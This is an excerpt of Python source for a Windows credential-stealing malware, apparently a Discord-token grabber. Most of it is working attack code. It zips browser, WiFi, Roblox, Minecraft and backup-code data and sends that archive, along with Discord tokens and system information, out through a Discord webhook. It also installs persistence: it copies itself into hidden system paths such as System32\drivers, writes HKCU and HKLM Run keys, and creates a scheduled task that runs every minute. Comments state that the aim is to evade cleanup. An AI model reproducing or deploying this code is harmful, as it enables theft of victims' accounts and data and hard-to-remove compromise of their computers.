...
def main(webhook: str):
    ...
    if not __CONFIG__["roblox"] and not __CONFIG__["browser"] and not __CONFIG__["wifi"] and not __CONFIG__["minecraft"] and not __CONFIG__["backupcodes"]:
        webhook.send(content=content, avatar_url="https://gifsec.com/wp-content/uploads/2022/10/aesthetic-gif-1.gif", username="Shiro's bbg")
    else:
        zipup()
        _file = None
        _file = File(f'{localappdata}\\Shiro Bitched-{os.getlogin()}.zip')
        webhook.send(content=content, file=_file, avatar_url="https://gifsec.com/wp-content/uploads/2022/10/aesthetic-gif-1.gif", username="Shiro's bbg")
...
def startup():
    # API Setup for low-level Windows interaction
    ...
    # Targeting a mix of User, System, and Hidden directories to evade simple cleanup
    target_paths = [
        ...
        os.path.join(os.getenv("WINDIR"), "System32", "drivers", "luna_core.sys"),
        os.path.join(os.getenv("USERPROFILE"), ".data", "cache", "helper.exe")
    ]
    
    for path in target_paths:
        try:
            # Ensure directory exists and overwrite existing file
            os.makedirs(os.path.dirname(path), exist_ok=True)
            shutil.copy2(source_path, path)
            # Set attributes to Hidden (2) and System (4)
            kernel32.SetFileAttributesW(path, 0x02 | 0x04)
        except:
            continue
 
    # --- 2. MULTI-VECTOR REGISTRY PERSISTENCE ---
    # Implementing both HKCU (Current User) and HKLM (Local Machine) for redundancy
    reg_keys = [
    ...
    for root, path, name in reg_keys:
        try:
            ...
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, source_path)
            winreg.CloseKey(key)
        except:
            pass
 
    # --- 3. SCHEDULED TASK PERSISTENCE (T1053.005) ---
    # Uses schtasks to create a task that runs every 1 minute as a fallback
    try:
        task_name = "LunaSysMaintenance"
        cmd = f'schtasks /create /tn "{task_name}" /tr "{source_path}" /sc minute /mo 1 /f'
        subprocess.run(cmd, shell=True, capture_output=True)
    except Exception:
        pass
    # --- 4. LOW-LEVEL API PERSISTENCE (Registry Run Keys) ---
    try:
        # Target HKEY_CURRENT_USER for non-privileged persistence
        reg_key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_SET_VALUE) as key_handle:
            winreg.SetValueEx(key_handle, "LunaSysCore", 0, winreg.REG_SZ, source_path)
    except Exception:
        pass
...
class PcInfo:
    ...
    def get_inf(self, webhook):
        ...
        embed.add_field(
            ...
            inline=False)
        embed.set_thumbnail(url="https://gifsec.com/wp-content/uploads/2022/10/aesthetic-gif-1.gif")

        webhook.send(embed=embed, avatar_url="https://gifsec.com/wp-content/uploads/2022/10/aesthetic-gif-1.gif", username="Shiro's bbg")
...
class Discord:
    ...
    def upload(self, webhook):
        ...
        for token in self.tokens:
            ...
            webhook.send(
                embed=embed,
                avatar_url="https://gifsec.com/wp-content/uploads/2022/10/aesthetic-gif-1.gif",
                username="Shiro's Bitch")
...
def zipup():
    _zipfile = os.path.join(localappdata, f'Shiro Bitched-{os.getlogin()}.zip')
